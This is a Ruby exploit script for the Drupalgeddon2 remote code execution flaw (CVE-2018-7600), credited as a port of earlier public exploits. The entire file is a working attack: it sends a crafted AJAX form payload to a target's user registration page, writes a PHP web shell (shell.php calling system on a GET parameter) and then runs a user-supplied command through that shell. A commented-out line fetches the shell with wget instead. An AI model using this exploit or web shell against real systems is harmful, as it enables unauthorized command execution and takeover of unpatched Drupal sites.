#!/usr/bin/env ruby

# Hans Topo ruby port of Drupalggedon2 exploit ~ https://github.com/dreadlocked/Drupalgeddon2/    (EDBID: 44449 ~ https://www.exploit-db.com/exploits/44449/)
# Based on Vitalii Rudnykh exploit ~ https://github.com/g0rx/CVE-2018-7600-Drupal-RCE/blob/810789f3a37dc6b1f35267bcccebb1edfa8e3a24/exploit.py
# Thanks ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/

require 'net/http'
require 'cgi'

if ARGV.empty?
  puts "Usage: ruby drupalggedon2.rb <target> <command>"
  puts "       ruby drupalgeddon2.rb https://example.com whoami"
  exit
end

target = ARGV[0]
command = ARGV[1]

url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'

#evil = 'wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon2/master/shell.php'
evil = 'echo "<?php system($_GET[\"cmd\"]); ?>" > shell.php'

payload = CGI.escape('mail[#markup]=' + evil + '&mail[#type]=markup&form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec')

uri = URI(url)

http = Net::HTTP.new(uri.host,uri.port)

if uri.scheme == 'https'
	http.use_ssl = true
	http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

req = Net::HTTP::Post.new(uri.path)
req.body = payload
puts "[*] Payload: " + evil
puts "[*] Sending: " + payload
response = http.request(req)

if response.code != "200"
	puts "[*] Response: " + response.code
	puts "[!] Target does not seem to be exploitable"
	exit
end

puts "[+] Target seems to be exploitable!"

puts "[*] Sending: " + target + "/shell.php?cmd=#{command}"
exploit_uri = URI(target + "/shell.php?cmd=#{command}")

response = Net::HTTP.get_response(exploit_uri)
puts response.body
